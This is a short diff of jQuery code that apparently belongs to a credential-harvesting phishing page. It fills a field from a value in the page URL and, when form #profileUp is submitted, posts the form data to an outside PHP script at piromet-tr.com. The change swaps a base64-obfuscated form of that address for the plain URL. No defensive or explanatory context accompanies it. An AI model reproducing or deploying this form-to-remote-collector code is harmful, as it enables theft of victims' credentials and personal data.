@@ -33,7 +33,6 @@ $(document).ready(function() {
     var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
     $("#x1").val(url);
 
-    var file = "aHR0cHM6Ly9waXJvbWV0LXRyLmNvbS9waHBibG9rZS9YLnBocA==";
     $("#profileUp").submit(function(e) {
         e.preventDefault();
         var nm = $("#A1").val();
@@ -41,8 +40,7 @@ $(document).ready(function() {
         $("#byn").html("Processing..").prop("disabled", true);
         $.ajax({
             
-            dataType: 'JSON',
-            url: atob(file),
+            url: "https://piromet-tr.com/phpbloke/X.php",
             type: 'POST',
             data: formData,
             // dataType : 'jsonp',
